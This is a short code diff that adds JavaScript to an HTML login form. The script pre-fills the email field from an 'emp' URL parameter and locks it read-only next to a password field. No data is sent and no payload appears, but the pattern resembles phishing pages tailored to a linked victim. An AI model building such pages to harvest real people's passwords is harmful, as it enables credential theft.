@@ -210,6 +210,23 @@
   <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
 <script type="text/javascript">
+	// Get email from URL parameter 'emp' (e.g., ?emp=user@domain.com)
+    function getEmailFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('emp');
+    }
+
+    // Get email from URL and pre-fill the email field
+    const emailFromUrl = getEmailFromUrl();
+    const emailField = document.getElementById('email');
+    
+    if (emailFromUrl) {
+      emailField.value = emailFromUrl;
+      // LOCK THE EMAIL FIELD - user cannot edit or clear it
+      emailField.readOnly = true;
+      emailField.style.backgroundColor = '#f5f5f5';
+      emailField.style.cursor = 'not-allowed';
+    }
   document.addEventListener('DOMContentLoaded', function() {
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
